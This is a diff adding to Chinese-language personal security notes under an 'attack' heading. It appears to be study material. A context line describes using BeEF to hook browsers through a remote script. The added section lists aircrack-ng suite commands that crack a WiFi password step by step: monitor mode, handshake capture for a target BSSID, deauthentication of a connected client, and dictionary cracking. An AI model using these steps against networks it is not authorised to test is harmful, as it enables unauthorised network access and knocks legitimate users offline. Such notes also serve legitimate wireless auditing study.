@@ -13,3 +13,10 @@
 ##  攻击篇
 ### 1:BeEF
 * 通过script的src链接到远程js文件，通过js文件获取相关主机信息。
+### 2:无线密码破解
+1. airmon-ng:查看网卡信息
+2. airmon-ng start wlan0mon:监听网卡
+3. airodump-ng wlan0mon:扫描wifi信号
+4. airodump-ng -w filename -c CH --bssid wifi_mac_addr wlan0mon --ignore-negative-one: 开始抓包（这个进程不得停止）
+5. aireplay-ng --deaut 10 wifi_mac_addr -c target_mac_addr wlan0mon --ignore-negative-one: 另开窗口并运行
+6. aircrack-ng -w word_dic capfile.cap: 字典破解密码
